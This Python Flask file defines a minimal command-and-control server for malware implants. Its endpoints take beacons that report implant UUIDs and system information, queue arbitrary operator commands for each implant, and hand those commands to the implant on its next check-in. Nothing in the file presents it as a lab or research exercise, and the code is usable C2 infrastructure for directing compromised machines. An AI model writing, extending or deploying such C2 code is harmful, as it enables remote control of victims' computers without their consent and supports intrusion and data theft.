from flask import Blueprint, request, jsonify
from app import db
from app.models import CommandQueue
import logging


logging.basicConfig(level=logging.INFO)

bp = Blueprint("api", __name__, url_prefix="/api/v1")


@bp.route("/beacon", methods=["POST"])
def beacon():
    data = request.get_json()
    timestamp = data.get("timestamp")
    implant_uuid = data.get("uuid")
    system_info = data

    logging.info(f"Received beacon from {implant_uuid} at {timestamp} seconds: {system_info}")

    command = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
    if command:
        db.session.delete(command)
        db.session.commit()
        command_response = {"command": command.command}
    else:
        command_response = {"command": ""}

    return jsonify(command_response)


@bp.route("/command", methods=["POST"])
def command():
    data = request.get_json()
    command_text = data.get("command")
    implant_uuid = data.get("uuid")

    if command_text and implant_uuid:
        command = CommandQueue(implant_uuid=implant_uuid, command=command_text)
        db.session.add(command)
        db.session.commit()
        return jsonify({"status": "Command added"}), 200
    else:
        return jsonify({"status": "Invalid command or UUID"}), 400


@bp.route("/uuids", methods=["GET"])
def list_uuids():
    uuids = db.session.query(CommandQueue.implant_uuid).distinct().all()
    return jsonify([uuid[0] for uuid in uuids])


@bp.route("/commands/<uuid>", methods=["GET"])
def get_commands(uuid):
    commands = CommandQueue.query.filter_by(implant_uuid=uuid).all()
    return jsonify([command.command for command in commands])
